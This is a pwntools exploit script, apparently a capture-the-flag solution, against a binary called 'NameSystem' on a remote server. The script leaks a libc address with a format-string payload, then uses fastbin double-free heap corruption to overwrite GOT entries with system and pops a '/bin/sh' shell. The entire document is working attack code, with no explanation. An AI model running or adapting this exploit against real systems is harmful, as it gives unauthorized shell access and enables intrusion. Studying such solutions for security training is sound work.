from pwn import *

context.log_level = 'debug'
context.binary = './NameSystem'
elf = ELF('./NameSystem')
libc = elf.libc
io = remote('183.129.189.62', '11205')

def new(size, content):
    io.sendline("1")
    io.sendlineafter("Size:", str(size))
    io.sendlineafter("Name:", content)

def show():
    io.sendline("2")

def free(idx):
    io.sendline("3")
    io.sendlineafter("delete:", str(idx))

def loop(func, times):
    for _i in range(times):
        func()

loop(lambda:new(0x50, "a" * 0x4), 2)
loop(lambda:new(0x20, "%13$lx"), 16)
loop(lambda:new(0x50, "a" * 0x4), 2)
free(0)
free(18)
free(0)
free(19)
loop(lambda:free(0), 2)
new(0x30, "a" * 0x4)
new(0x30, "b" * 0x4)
new(0x30, "c" * 0x4)
free(17)
free(18)
free(17)
free(19)
loop(lambda:free(0), 4)
new(0x50, p64(0x602000 - 6))
new(0x50, 'b' * 0x4)
new(0x50, 'c' * 0x4)
new(0x50, '\x00' * 6 + '\x00' * 8 + p64(0x4006d0)[:7])
free(0)
libc_base = int(io.recv(), 16) - 0x20740 - 240
loop(lambda:free(0), 4)
new(0x30, p64(0x602020 + 2))
new(0x30, 'd' * 0x4)
new(0x30, '/bin/sh\x00')
new(0x30, '\x00' * 6 + p64(libc_base + 0x45390)[:7])
io.sendline("3")
io.sendline("16")
io.interactive()
